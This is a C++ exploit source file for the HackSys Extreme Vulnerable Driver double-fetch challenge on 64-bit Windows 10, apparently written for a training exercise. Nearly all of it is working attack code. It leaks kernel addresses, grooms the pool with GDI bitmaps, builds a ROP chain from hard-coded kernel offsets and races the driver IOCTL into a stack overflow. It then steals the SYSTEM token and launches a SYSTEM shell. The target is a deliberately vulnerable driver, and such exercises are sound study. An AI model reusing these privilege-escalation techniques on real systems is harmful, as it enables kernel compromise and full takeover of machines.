// HEVD-DoubleFetch.cpp : Defines the entry point for the console application.
//

/////////////
// Exploit Steps: 
//
//
#include "stdafx.h"
#define DF_IOCTL 0x222037 // Double-Fetch IOCTL
#define lpDeviceName L"\\\\.\\HackSysExtremeVulnerableDriver"

#define MAX_TRIES 0x100   // number of times to attempt re-allocating a previously free'd paged session (GDI) pool object
#define BITMAP_SIZE 0x8f0 // comes out to 0x1000 bytes (4KB). internal conversion from ascii to unicode so need to x2. why does 0x7f0 not work?

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"kernel32.lib")

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#ifdef _WIN64
typedef void*(NTAPI *HMVALIDATEHANDLE)(HANDLE, DWORD);	
#else
typedef void*(__fastcall *HMVALIDATEHANDLE)(HANDLE, DWORD);
#endif

PBYTE pWND = 0x0;
PBYTE pcls = 0x0;

PBYTE user32Base = 0x0; // for ROP gadgets
PVOID pIsMenu = NULL;

bool exploited = false;

HBITMAP hManager = 0x0;
HBITMAP hWorker = 0x0;
PBYTE  pManagerpvScan0 = 0x0;
PBYTE  pWorkerpvScan0 = 0x0;
PBYTE  pManager = 0x0;
PBYTE  pWorker = 0x0;
ULONG_PTR ulClientDelta = 0x0;

DWORD64 eprocess = 0x0;
LPVOID curToken = 0x0;

bool elevated = false;

HMVALIDATEHANDLE pHMValidateHandle = NULL;

HANDLE OpenDrv(const wchar_t *path) {
	return CreateFile(path,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
}

LRESULT CALLBACK wndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProcA(hwnd, uMsg, wParam, lParam);
}

struct _WWW {
	PVOID what;
	PVOID where;
}WWW;

typedef struct _DOUBLE_FETCH {
	PVOID Buffer;
	SIZE_T Size;
}DOUBLE_FETCH, *PDOUBLE_FETCH;

typedef struct _RACING_THREAD_PARAMETER { // to pass relevant info to CreateThread()
	HANDLE hDrv;
	PDOUBLE_FETCH dFetch;
} RACING_THREAD_PARAMETER, *PRACING_THREAD_PARAMETER;

void debug_printf(char* msgbuf) {
	OutputDebugStringA((const char*)msgbuf);
}

PBYTE findByte(PBYTE haystack, BYTE needle) {
	for (int i = 0; i < 0x200; i++) {
		if (*haystack == needle) {
			return haystack;
		}
		else {
			haystack += 1;
		}
	}
	return 0;
}

VOID findHMValidateHandle() {
	PBYTE byteAddr = NULL;
	int   offset = NULL;
	BYTE  target = 0xe8;
	MODULEINFO module_info;

	/*
	2.1. get proc address of user32!IsMenu
	2.2. iterate through user32!IsMenu looking for 0xe8
	2.3. calculate HMValidateHandle() addr using bytes following `0xe8` which represent
	offset from `pIsMenu` - 0xb
	*/
	
	HMODULE hUser32 = LoadLibraryA("User32.dll");
	//printf("[+] hUser32: %p\n", hUser32);

	memset(&module_info, 0, sizeof(module_info));
	GetModuleInformation(GetCurrentProcess(), hUser32, &module_info, sizeof(module_info));
	user32Base = (PBYTE)module_info.lpBaseOfDll;
	//printf("[+] user32_base: %p\n", user32Base);
	pIsMenu = GetProcAddress(hUser32, "IsMenu");
	//printf("[+] User32!IsMenu found at: 0x%p\n", pIsMenu);
	byteAddr = findByte((PBYTE)pIsMenu, target);

	offset = *(int *)(byteAddr + 1);
	pHMValidateHandle = (HMVALIDATEHANDLE)((PBYTE)pIsMenu + offset + 0xb);

	return;
}

PBYTE allocWindow() {
	/*
	3.1.a. Create a custom Window class, using `victimClass.lpszMenuName` > 4kb to allocate a chunk in the paged session pool 
	3.1.b. Register custon Window class created in 3.1.a
	3.1.c. Create a Window using the same Window class as the one registered in 3.1.b, which simultaneously does 3 things:
		+ allocs tagWND obj in DESKTOP HEAP
		+ allocs tagCLS obj in DESKTOP HEAP
		+ allocs `*(tagCLS.lpszMenuNameOffset)` in PAGED SESSION (GDI) POOL
	3.1.d. Use HMValidateHandle() addr found in 2.3 to leak user land addr of tagWND obj
	3.1.e. Print `*(tagWND.pSelf)` to leak kernel land addr of tagWND obj
	3.1.f. Calculate `ulClientDelta` from 3.1.d and 3.1.e to determine distance between kernel land and user land mapped DESKTOP HEAP's
	3.1.g. Use `ulClientDelta` from 3.1.f to get *(tagCLS.lpszMenuNameOffset) kaddr which is alloc'd in PAGED SESSION (GDI) Pool
	3.1.h. Destroy Window to free chunk leaked in 3.1.g
	3.1.i. Unregister custom Window class
	*/
	printf("[*] allocating victim class name in kernel paged session pool...\n");

	PBYTE pSelf = 0x0;
	PBYTE prevAlloc = 0x0;
	pWND = 0x0;
	pcls = 0x0;
	PBYTE lpszMenuName = 0x0;

	// Win10 RS2 offsets -- readable from usermode Desktop Heap
	BYTE pSelfOffset = 0x20;		 // tagWND member; always contains ptr to kaddr of tagWND obj
	BYTE pclsOffset = 0xa8;			 // tagWND member; always points to kaddr of tagCLS obj
	//BYTE lpszMenuNameOffset = 0x90;  // tagCLS member; always points to kaddr of menuName in GDI pool <-- 1703 offset!
	BYTE lpszMenuNameOffset = 0x98;  // tagCLS member; always points to kaddr of menuName in GDI pool   <-- 1709 offset!

	WNDCLASSEXA victimClass = { 0 }; // set every member of WNDCLASSEX object to 0

	char menuName[BITMAP_SIZE] = { 0 };			    // BITMAP_SIZE should be > 4kb so chunk is alloc'd in the Large Pool which has low-entropy
	memset(menuName, 0x41, sizeof(menuName) - 1);

	char className[] = "boobs";

	victimClass.cbSize = sizeof(WNDCLASSEXA);
	victimClass.lpfnWndProc = wndProc;              // default window procedure wndProc
	victimClass.lpszMenuName = (LPCSTR)menuName;    // allocates menuName in Paged Session (GDI) pool
	victimClass.lpszClassName = (LPCSTR)className;  // sets class name to "boobs"

	ATOM tagCLSID = RegisterClassExA(&victimClass); // registers class
	if (tagCLSID == 0) {
		fprintf(stderr, "[!] window class could not be registered. exiting now!\n");
		exit(-1);
	}

	/*
	typedef struct tagWNDCLASSEXA {
	UINT        cbSize;
	UINT        style;
	WNDPROC     lpfnWndProc;
	int         cbClsExtra;
	int         cbWndExtra;
	HINSTANCE   hInstance;
	HICON       hIcon;
	HCURSOR     hCursor;
	HBRUSH      hbrBackground;
	LPCSTR      lpszMenuName;
	LPCSTR      lpszClassName;
	HICON       hIconSm;
	} WNDCLASSEXA, *PWNDCLASSEXA, NEAR *NPWNDCLASSEXA, FAR *LPWNDCLASSEXA;
	*/

	/*
	wClass.cbSize = sizeof(WNDCLASSEXA);
	wClass.hInstance = GetModuleHandle(NULL);
	wClass.lpszMenuName = (LPCSTR) byteArray;
	wClass.lpszClassName = className;
	wClass.lpfnWndProc = WindowProc;
	*/

	/*
	HWND WINAPI CreateWindowEx(
	_In_     DWORD     dwExStyle,
	_In_opt_ LPCTSTR   lpClassName,
	_In_opt_ LPCTSTR   lpWindowName,
	_In_     DWORD     dwStyle,
	_In_     int       x,
	_In_     int       y,
	_In_     int       nWidth,
	_In_     int       nHeight,
	_In_opt_ HWND      hWndParent,
	_In_opt_ HMENU     hMenu,
	_In_opt_ HINSTANCE hInstance,
	_In_opt_ LPVOID    lpParam
	);
	*/
	char windowName[] = "OTA";
	HWND htagWND = CreateWindowExA(0, className, windowName, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	if (htagWND == NULL) {
		fprintf(stderr, "[!] window could not be created. exiting now!\n");
		exit(-1);
	}

	pWND = (PBYTE)pHMValidateHandle(htagWND, 0x1); // returns usermode tagWND addr; relies on Desktop Heap which is mapped in userland

	pSelf = *(PBYTE *)(pWND + pSelfOffset);		   // get kernelmode tagWND addr
	ulClientDelta = pSelf - pWND;				   // calculate `Kernel Desktop Heap - Userland Desktop Heap = ulClientDelta`

	printf("[*] allocating and destroying win32k!tag* objects\n");
	printf("    [+] user tagWND found: 0x%p\n", pWND);
	printf("    [+] kernel tagWND found: 0x%p\n", pSelf);
	printf("    [+] kernel win32k!tagWND leaked\n");

	pcls = *(PBYTE *)(pWND + pclsOffset);                                  // kernel tagCLS addr
	lpszMenuName = *(PBYTE *)(pcls - ulClientDelta + lpszMenuNameOffset);  // kernel tagCLS.lpszMenuName pool chunk addr

	printf("    [+] user tagCLS found: 0x%p\n", (pcls - ulClientDelta));
	printf("    [+] kernel tagCLS found: 0x%p\n", pcls);
	printf("    [+] lpszMenuName found: 0x%p\n\n", lpszMenuName);

	// Sleep(7000);
	// cleanup

	if (DestroyWindow(htagWND) == 0) {
		fprintf(stderr, "Window could not be destroyed. Exiting now!\n");
		exit(-1);
	}

	if (UnregisterClassA(className, 0x0) == 0) {
		fprintf(stderr, "Class could not be unregistered. Exiting now!\n");
		exit(-1);
	}
	
	return lpszMenuName;
}

PBYTE leakPoolChunk() {
	PBYTE prevAlloc = 0x0;
	PBYTE newAlloc = 0x0;

	for (int i = 0; i < MAX_TRIES; i++) {
		newAlloc = allocWindow();
		if (prevAlloc == newAlloc) { // keep successively allocating and free-ing until same pool chunk is returned twice
			break;
		}
		prevAlloc = newAlloc;
		newAlloc = 0x0;
	}
	if (newAlloc == 0x0) {
		fprintf(stderr, "[!] matching chunks could not be found. exiting now!\n");
	}
	printf("[+] UAF succeeded!\n");
	printf("[+] paged session pool chunk leaked: 0x%p\n", newAlloc);
	return newAlloc;
}

VOID heapGroom() {
	/*
	3.1. Leak kernel paged session (GDI) pool chunks by allocating and freeing a lpszMenuName object > 4k bytes in the large pool
	3.2. Immediately allocate GDI objects in place of previously leaked kernel chunks free'd in 3.1
	*/
	printf("[*] starting pool leak 1...\n");
	pManager = leakPoolChunk();
	hManager = CreateBitmap(0x1000, 0x7, 0x1, 0x1, NULL);
	pManagerpvScan0 = pManager + 0x50;
	printf("[+] ulClientDelta found: 0x%p\n", ulClientDelta);
	printf("[+] hManager: 0x%X\n\n", hManager);
	printf("[+] Manager pvScan0: 0x%p\n\n", pManagerpvScan0);

	printf("[*] starting pool leak 2...\n");
	pWorker = leakPoolChunk();
	hWorker = CreateBitmap(0x1000, 0x7, 0x1, 0x1, NULL);
	pWorkerpvScan0 = pWorker + 0x50;
	printf("[+] hWorker: 0x%X\n\n", hWorker);
	printf("[+] Worker pvScan0: 0x%p\n\n", pWorkerpvScan0);
	return;
}

int setPvScan0(HBITMAP hBitmap, LPVOID data) {
	int numBytes = 0;

	numBytes = SetBitmapBits(hBitmap, sizeof(data), data);
	if (numBytes == 0) {
		fprintf(stderr, "[!] SetBitmapBits() failed. exiting now!\n");
		exit(-1);
	}
	return numBytes;
}

int getPvScan0(HBITMAP hBitmap, LPVOID dest) {
	int numBytes = 0;

	numBytes = GetBitmapBits(hBitmap, sizeof(dest), dest);
	if (numBytes == 0) {
		fprintf(stderr, "[!] GetBitmapBits() failed. exiting now!\n");
		exit(-1);
	}
	return numBytes;
}

VOID readQword(LPVOID target, LPVOID dest) {
	setPvScan0(hManager, &target);
	getPvScan0(hWorker, dest);
	return;
}

VOID writeQword(LPVOID target, LPVOID value) {
	setPvScan0(hManager, &target);
	setPvScan0(hWorker, &value);
	return;
}

void dataOnlyTokenSteal() {
	/*
	Data-only token stealing technique by Morten Schenk
	https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code

	5.1. Get KTHREAD of current thread/process by using arbitrary read primitive
	5.2. Get EPROCESS of current thread/process
	5.4. Traverse `EPROCESS->ActiveProcessLinks` until EPROCESS of SYSTEM is found
	5.5. Read SYSTEM token
	5.6. Patch current EPROCESS's token w/ SYSTEM token from 5.5 by using arbitrary write primitive
	*/
	DWORD64 kthread = 0x0;
	DWORD64 nextEprocess = 0x0;
	DWORD64 nextPID = 0x0;
	DWORD64 ppid = 0x0;
	DWORD64 parentEprocess = 0x0;
	DWORD64 systemEprocess = 0x0;
	DWORD64 flink = 0x0;
	DWORD64 nextUniquePID = 0x0;
	LPVOID systemToken = 0x0;
	PBYTE pTI = *(PBYTE *)(pWND + 0x10); // KTHREAD of current thread/process

	int found = 0x0;

	// get cur process's KTHREAD struct from tagWND struct
	readQword(pTI, &kthread);
	printf("[+] current KTHREAD found at: 0x%p\n", kthread);
	// get cur process's EPROCESS struct
	readQword((PBYTE)(kthread + 0x220), &eprocess);
	printf("[+] current EPROCESS found at: 0x%p\n", eprocess);
	readQword((PBYTE)(eprocess + 0x358), &curToken);

	nextEprocess = eprocess;
	// iterate through EPROCESS's via `ActiveProcessLinks` looking for PID == 0x4 (SYSTEM)
	while (1) {
		/*
		RS2 offsets:
		kd> dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks.
		dtx is unsupported for this scenario.  It only recognizes dtx [<type>] [<address>] with -a, -h, and -r.  Reverting to dt.
		+0x2e0 UniqueProcessId     : Ptr64 Void
		+0x2e8 ActiveProcessLinks  :
		+0x000 Flink               : Ptr64 _LIST_ENTRY
		+0x008 Blink               : Ptr64 _LIST_ENTRY
		+0x358 Token               : _EX_FAST_REF
		*/
		readQword((PBYTE)(nextEprocess + 0x2e8), &flink);
		//printf("[*] flink found: %p\n", flink);
		// get next eprocess
		nextEprocess = flink - 0x2e8;
		//printf("[*] next EPROCESS: %p\n", nextEprocess);
		// get next eprocess's unique PID
		readQword((PBYTE)(nextEprocess + 0x2e0), &nextPID);
		if (nextPID == 0x4) {
			systemEprocess = nextEprocess;
			printf("[+] SYSTEM EPROCESS found at: 0x%p\n", systemEprocess);
			break;
		}
	}

	// patch token
	readQword((PBYTE)(systemEprocess + 0x358), &systemToken);
	printf("[+] SYSTEM token found: 0x%p\n\n", systemToken);
	writeQword((PBYTE)(eprocess + 0x358), systemToken);
	elevated = true;

	return;
}

void preamble(void) {


	printf("\n");
	printf("                        -o+++oo/---....         .\n");
	printf("                        `o+osss-      `-///:/+oso`\n");
	printf("                         .o+osss-        :sssssss-\n");
	printf("                          .s/osss-        .+sssss`\n");
	printf("                           -s/ssss:        `+sss/\n");
	printf("                            :s/ssss:`-/++++//oo:\n");
	printf("                             /o/ssss+/-.``````\n");
	printf("                              /o+ss/`\n");
	printf("                               +o+o\n");
	printf("                 `-            `+ss.                     -\n");
	printf("                 /o             `oso+`                  `s-\n");
	printf("                 os.             .ss+o/`                :s+\n");
	printf("                 oso`           `/s/:ooo.              .ss/\n");
	printf("                 :ss+`          :ss`:ooso`            `oss-\n");
	printf("                 `osso.         +ss: /oss:           -oss+ `\n");
	printf("                /`.osso:`       oss: /oo/          `/ssso``/\n");
	printf("                :o:-ossso:`    :ss+..-/ss.       `:ossso-:o.\n");
	printf("                `:sosssssso/. :ssssso+.+so.    -/ossssssso-`\n");
	printf("               `sso/:/+ssssssssssss-o..-//ossssssssss+::/oso\n");
	printf("                :sssssosssssssssss::ssssss://sssssssoosssss-\n");
	printf("                 /ssssssssssssssss.ssssssss-+/ssssssssssss:\n");
	printf("\n");
	printf("    HackSys Extreme Vulnerable Driver (HEVD) Double Fetch/TOCTOU Challenge\n");
	printf("        Target: Windows 10 64-bit Creators Update 1703 (Build 15063)\n");
	printf("                          by Joshua Wang (@rh0gue)\n\n");

}

DWORD WINAPI flippingThread(LPVOID dFetchSize) {
	printf("    [-] flipping thread on core: %d\n", GetCurrentProcessorNumber());
	while (exploited == false) {
		*(PULONG)dFetchSize ^= 0x68;
	}
	return 0; 
}

DWORD WINAPI racingThread(LPVOID parameter) {
	LARGE_INTEGER frequency; 
	LARGE_INTEGER start;
	LARGE_INTEGER end;
	double interval;

	HANDLE hDrv = ((PRACING_THREAD_PARAMETER)parameter)->hDrv;
	PDOUBLE_FETCH dFetch = ((PRACING_THREAD_PARAMETER)parameter)->dFetch;
	DWORD numBytes = 0;
	DWORD64 test; 
	printf("    [-] racing thread on core: %d\n", GetCurrentProcessorNumber());
	
	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&start);
	while (exploited == false) {
		DeviceIoControl(hDrv, DF_IOCTL, dFetch, sizeof(dFetch), NULL, 0, &numBytes, NULL);
		readQword((PBYTE)(pIsMenu), &test);

		if (test == 0x5e802b228ec8348) { // check to see if we can read the first qword in User32!IsMenu
			QueryPerformanceCounter(&end);
			interval = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;
			exploited = true;
			printf("[+] race won!\n");
			printf("    [-] time taken: %f s\n\n", interval);
			if (elevated == false) {
				printf("[*] finding SYSTEM token...\n");
				dataOnlyTokenSteal();
				break;
			}
		}
	}
	return 0;
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	ULONG Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	CHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

PVOID GetAddr(char *target) {
	// reverseengineering.stackexchange.com/questions/12625/find-address-of-windows-kernel-functions
	// need to get correct size

	// NtQuerySystemInformation does not return the correct required buffer 
	// size if the buffer passed is too small. Instead you must call the 
	// function while increasing the buffer size until the function no longer 
	// returns STATUS_INFO_LENGTH_MISMATCH.

	NTSTATUS status;
	ULONG len = 0;
	int i = 0;
	bool found = false;

	// get list of all modules on the system
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, NULL, 0, &len); // get correct len
	PRTL_PROCESS_MODULES moduleList = (PRTL_PROCESS_MODULES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len);
	status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, moduleList, len, &len); // use correct len to retrieve module list

	if (status == STATUS_INFO_LENGTH_MISMATCH) {
		fprintf(stderr, "[!] could not retrieve SMI. exiting now!\n");
		exit(-1);
	}

	PRTL_PROCESS_MODULE_INFORMATION moduleEntry = moduleList->Modules; // get first module

	for (i = 0; i < moduleList->NumberOfModules; i++) {	// iterate through modules, looking for match
		if (!strcmp(moduleEntry[i].FullPathName + moduleEntry[i].OffsetToFileName, target)) {
			found = true;
			break;
		}
	}
	if (!found) {
		fprintf(stderr, "[!] module '%s' not found! exiting now!\n", target);
		exit(-1);
	}
	HeapFree(GetProcessHeap(), 0, (LPVOID)moduleList); // free moduleList
	return moduleEntry[i].ImageBase;
}

PBYTE *GenerateROPChain(PBYTE pNT) {
	struct _ropGadgets {
		PBYTE pop_r8;		// pop r8 ; ret 
		PBYTE pop_rax;		// pop rax ; ret
		PBYTE mov_rax_r8;	// mov qword ptr [rax], r8 ; ret
		PBYTE xor_rax_rax;	// xor rax, rax ; ret
		PBYTE ret;			// ret
	}ropGadgets;

	ropGadgets.pop_r8 = pNT + 0x11bd31;
	ropGadgets.pop_rax = pNT + 0x6941;
	ropGadgets.mov_rax_r8 = pNT + 0xc0b2f;
	ropGadgets.xor_rax_rax = pNT + 0x15684a;
	ropGadgets.ret = pNT + 0x15b3;

	PBYTE ropChain[] = {
		ropGadgets.pop_r8,				// pop r8 ; ret
		pWorkerpvScan0,
		ropGadgets.pop_rax,				// pop rax ; ret
		pManagerpvScan0,	
		ropGadgets.mov_rax_r8,			// mov qword ptr [rax], r8 ; ret (set pManager->pvScan0 = &(pWorker->pvScan0))
		ropGadgets.xor_rax_rax,			// xor rax, rax ; ret
		ropGadgets.ret,					
		ropGadgets.ret,
		ropGadgets.ret,
		ropGadgets.ret,
		ropGadgets.ret,
		ropGadgets.ret
	};

	return ropChain;
}

int wmain()
{
	preamble();

	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	printf("[+] num of cores detected: %d\n", sysInfo.dwNumberOfProcessors);
	//SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

	// Step 1. Get handle to the driver
	printf("[*] opening handle to driver...\n");
	HANDLE hDrv = OpenDrv(lpDeviceName);
	printf("[+] hDrv: %p\n\n", hDrv);
	if ((int)hDrv == -1) {
		fprintf(stderr, "[!] handle not created. exiting now!\n");
		exit(-1);
	}

	// Step 2. Find addr of HMValidateHandle()
	printf("[*] locating HMValidateHandle...\n");
	findHMValidateHandle();

	if (pHMValidateHandle == NULL) {
		fprintf(stderr, "HMValidateHandle not found! Exiting...\n");
		exit(-1);
	}

	printf("[+] HMValidateHandle found at: %p\n\n", pHMValidateHandle);

	// Step 3. Setup GDI manager and worker bitmaps and leak their addresses
	heapGroom();

	// Step 4. Get kernel image base address
	PBYTE pNT = (PBYTE)GetAddr("ntoskrnl.exe"); 
	printf("[+] pNT found at: %p\n", pNT); // kernel image base addr

	// Step 5. Generate ROP chain 
	printf("[*] generating ROP chain...\n\n");
	PBYTE *ropChain = GenerateROPChain(pNT);

	/* 
	Step 6. Perform the double-fetch exploit to trigger a kernel stack buffer overflow
	*/
	printf("[*] reticulating splines...\n");
	PRACING_THREAD_PARAMETER pRacingParameter;
	PDOUBLE_FETCH pDFetch;

	pRacingParameter = (PRACING_THREAD_PARAMETER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RACING_THREAD_PARAMETER));
	pDFetch = (PDOUBLE_FETCH)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DOUBLE_FETCH));

	char *inBuf = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
	
	memset(inBuf, 0x41, 0x808);
	memcpy(inBuf+0x808, ropChain, 0x60);

	pDFetch->Buffer = inBuf;
	pDFetch->Size = 0x800;
	pRacingParameter->hDrv = hDrv;
	pRacingParameter->dFetch = pDFetch;
	
	HANDLE hFlipThread = 0x0;
	HANDLE hRaceThread = 0x0;

	DWORD_PTR mask = 0;

	hFlipThread = CreateThread(NULL, 0, flippingThread, &pDFetch->Size, CREATE_SUSPENDED, 0);
	SetThreadPriority(hFlipThread, THREAD_PRIORITY_HIGHEST);
	SetThreadAffinityMask(hRaceThread, 0x1); // cpu 1

	hRaceThread = CreateThread(NULL, 0, racingThread, pRacingParameter, CREATE_SUSPENDED, 0);
	SetThreadPriority(hRaceThread, THREAD_PRIORITY_HIGHEST);
	SetThreadAffinityMask(hFlipThread, 0x2); // cpu 2
	
	printf("[+] beginning race!\n");
	ResumeThread(hRaceThread);
	ResumeThread(hFlipThread);

	// Step 7. Use data-only attack to steal token w/out using shellcode 

	if (WaitForSingleObject(hRaceThread, 5000)) {
		TerminateThread(hFlipThread, EXIT_SUCCESS);
		TerminateThread(hRaceThread, EXIT_SUCCESS);
		CloseHandle(hFlipThread);
		CloseHandle(hRaceThread);
	}

	if (exploited == true) {
		// Step 6. Win!
		printf("[$] Enjoy your SYSTEM shell...\n\n");
		system("cmd.exe");
	}

	writeQword((PBYTE)(eprocess + 0x358), curToken); // restoring original token
	TerminateThread(GetCurrentThread(),0);
	ExitProcess(0);
	return 0;
}